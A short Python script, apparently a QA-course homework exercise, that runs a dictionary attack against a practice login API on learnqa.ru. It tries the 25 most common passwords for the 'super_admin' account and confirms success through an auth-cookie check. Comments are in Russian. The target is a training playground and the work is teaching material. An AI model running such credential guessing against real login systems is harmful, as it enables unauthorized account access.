import requests

login = "super_admin"

# Берем пароли по ссылке из таблицы "Top 25 most common passwords by year according to SplashData" (за 2019 год)
passwords = [
    "123456", "123456789", "qwerty", "password", "1234567",
    "12345678", "12345", "iloveyou", "111111", "123123",
    "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
    "654321", "555555", "lovely", "7777777", "welcome",
    "888888", "princess", "dragon", "password1", "123qwe"
]

get_secret_password_homework_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in passwords:
    response = requests.post(get_secret_password_homework_url, data={"login": login, "password": password})

    auth_cookie = response.cookies.get('auth_cookie')

    check_response = requests.post(check_auth_cookie_url, cookies={'auth_cookie': auth_cookie})

    if check_response.text == "You are authorized":
        print(f"Верный пароль найден: {password}. Ответ: {check_response.text}")
        break
    else:
        print(f"Пароль '{password}' неверный. Ответ: {check_response.text}")